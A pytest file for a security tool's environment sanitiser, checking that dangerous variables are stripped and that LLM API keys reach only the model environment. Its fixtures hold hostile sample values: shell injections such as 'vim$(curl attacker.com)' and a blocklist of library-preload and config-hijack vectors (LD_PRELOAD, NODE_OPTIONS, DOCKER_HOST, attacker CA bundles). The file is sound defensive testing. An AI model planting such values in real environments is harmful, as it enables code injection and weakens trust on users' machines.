"""Tests for Claude Code settings-based attack mitigations."""

import json
import os
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

# core/security/tests/test_security_mitigations.py -> repo root
sys.path.insert(0, str(Path(__file__).parents[3]))

from core.config import RaptorConfig


class TestSafeEnv:
    """get_safe_env() strips dangerous environment variables."""

    def test_strips_terminal(self):
        with patch.dict(os.environ, {"TERMINAL": "xterm; touch /tmp/pwned"}):
            env = RaptorConfig.get_safe_env()
            assert "TERMINAL" not in env

    def test_strips_editor(self):
        with patch.dict(os.environ, {"EDITOR": "vim$(curl attacker.com)"}):
            env = RaptorConfig.get_safe_env()
            assert "EDITOR" not in env

    def test_strips_visual(self):
        with patch.dict(os.environ, {"VISUAL": "code"}):
            env = RaptorConfig.get_safe_env()
            assert "VISUAL" not in env

    def test_strips_browser(self):
        with patch.dict(os.environ, {"BROWSER": "firefox"}):
            env = RaptorConfig.get_safe_env()
            assert "BROWSER" not in env

    def test_strips_pager(self):
        with patch.dict(os.environ, {"PAGER": "less"}):
            env = RaptorConfig.get_safe_env()
            assert "PAGER" not in env

    def test_strips_proxy_vars(self):
        with patch.dict(os.environ, {"HTTP_PROXY": "http://proxy:8080"}):
            env = RaptorConfig.get_safe_env()
            assert "HTTP_PROXY" not in env

    def test_preserves_path(self):
        env = RaptorConfig.get_safe_env()
        assert "PATH" in env

    def test_preserves_home(self):
        env = RaptorConfig.get_safe_env()
        assert "HOME" in env

    def test_strips_runtime_library_path_vars(self):
        """Library-path redirection vectors across runtimes must all be stripped.

        LD_PRELOAD, PYTHONPATH, NODE_PATH, etc. are the same class of attack
        as shell-eval env vars — a tainted env can inject arbitrary code
        into a sandboxed child via library resolution.
        """
        dangerous = {
            "LD_PRELOAD": "/tmp/evil.so",
            "LD_LIBRARY_PATH": "/tmp",
            "LD_AUDIT": "/tmp/audit.so",
            "PYTHONPATH": "/tmp/evil",
            "PYTHONHOME": "/tmp",
            "PYTHONINSPECT": "1",
            "PYTHONSTARTUP": "/tmp/startup.py",
            "PERL5OPT": "-Mevil",
            "PERLLIB": "/tmp",
            "PERL5LIB": "/tmp",
            "RUBYOPT": "-revil",
            "RUBYLIB": "/tmp",
            "NODE_OPTIONS": "--require=/tmp/evil",
            "NODE_PATH": "/tmp",
        }
        with patch.dict(os.environ, dangerous):
            env = RaptorConfig.get_safe_env()
            for name in dangerous:
                assert name not in env, f"{name} leaked into safe env"

    def test_strips_tool_config_override_vars(self):
        """Tool-specific config-override vectors — each loads attacker code
        or weakens trust for a specific runtime / CLI tool. Allowlist-first
        catches them by default; this test pins the blocklist behaviour for
        callers who supply their own env= and rely on DANGEROUS_ENV_VARS
        being enforced as belt-and-braces.
        """
        dangerous = {
            "CLASSPATH": "/tmp/evil.jar",
            "MAVEN_OPTS": "-javaagent:/tmp/evil.jar",
            "GRADLE_OPTS": "-javaagent:/tmp/evil.jar",
            "CARGO_HOME": "/tmp/evil-cargo",
            "GEM_HOME": "/tmp/evil-gems",
            "GEM_PATH": "/tmp/evil-gems",
            "BUNDLE_GEMFILE": "/tmp/evil/Gemfile",
            "PHPRC": "/tmp/evil.ini",
            "PHP_INI_SCAN_DIR": "/tmp/evil",
            "GIT_EXEC_PATH": "/tmp/evil-git-bin",
            "GIT_TEMPLATE_DIR": "/tmp/evil-template",
            "EMACSLOADPATH": "/tmp/evil-el",
            "DOCKER_CONFIG": "/tmp/evil-docker",
            "DOCKER_HOST": "tcp://evil:2375",
            "REQUESTS_CA_BUNDLE": "/tmp/attacker-ca.pem",
            "CURL_CA_BUNDLE": "/tmp/attacker-ca.pem",
            "SSL_CERT_FILE": "/tmp/attacker-ca.pem",
            "SSL_CERT_DIR": "/tmp/attacker-ca/",
        }
        with patch.dict(os.environ, dangerous):
            env = RaptorConfig.get_safe_env()
            for name in dangerous:
                assert name not in env, f"{name} leaked into safe env"


class TestLlmEnv:
    """get_llm_env() passes API keys that get_safe_env() blocks."""

    def test_safe_env_blocks_api_keys(self):
        with patch.dict(os.environ, {"ANTHROPIC_API_KEY": "sk-ant-test"}):
            env = RaptorConfig.get_safe_env()
            assert "ANTHROPIC_API_KEY" not in env

    def test_llm_env_passes_api_keys(self):
        keys = {
            "ANTHROPIC_API_KEY": "sk-ant-test",
            "OPENAI_API_KEY": "sk-test",
            "GEMINI_API_KEY": "AIza-test",
            "MISTRAL_API_KEY": "mist-test",
        }
        with patch.dict(os.environ, keys):
            env = RaptorConfig.get_llm_env()
            for name, val in keys.items():
                assert env.get(name) == val, f"{name} missing from llm env"

    def test_llm_env_omits_unset_keys(self):
        with patch.dict(os.environ, {}, clear=True):
            os.environ["PATH"] = "/usr/bin"
            os.environ["HOME"] = "/tmp"
            env = RaptorConfig.get_llm_env()
            for var in RaptorConfig.LLM_API_KEY_VARS:
                assert var not in env

    def test_llm_env_still_strips_dangerous(self):
        with patch.dict(os.environ, {"LD_PRELOAD": "/tmp/evil.so",
                                      "ANTHROPIC_API_KEY": "sk-ant-test"}):
            env = RaptorConfig.get_llm_env()
            assert "LD_PRELOAD" not in env
            assert env.get("ANTHROPIC_API_KEY") == "sk-ant-test"


# NOTE: `TestCheckRepoClaudeSettings` was removed — the function
# `_check_repo_claude_settings` in raptor_agentic.py was superseded by
# `check_repo_claude_trust` in `core/security/cc_trust.py` (PR #185).
# Coverage for the new API lives in `core/security/tests/test_cc_trust.py`.


class TestRepoDefault:
    """--repo defaults to RAPTOR_CALLER_DIR."""

    def test_env_var_used_as_default(self, tmp_path):
        """argparse picks up RAPTOR_CALLER_DIR when --repo not specified."""
        import argparse
        with patch.dict(os.environ, {"RAPTOR_CALLER_DIR": str(tmp_path)}):
            default = os.environ.get("RAPTOR_CALLER_DIR")
            assert default == str(tmp_path)

    def test_env_var_not_set_gives_none(self):
        env = os.environ.copy()
        env.pop("RAPTOR_CALLER_DIR", None)
        with patch.dict(os.environ, env, clear=True):
            assert os.environ.get("RAPTOR_CALLER_DIR") is None
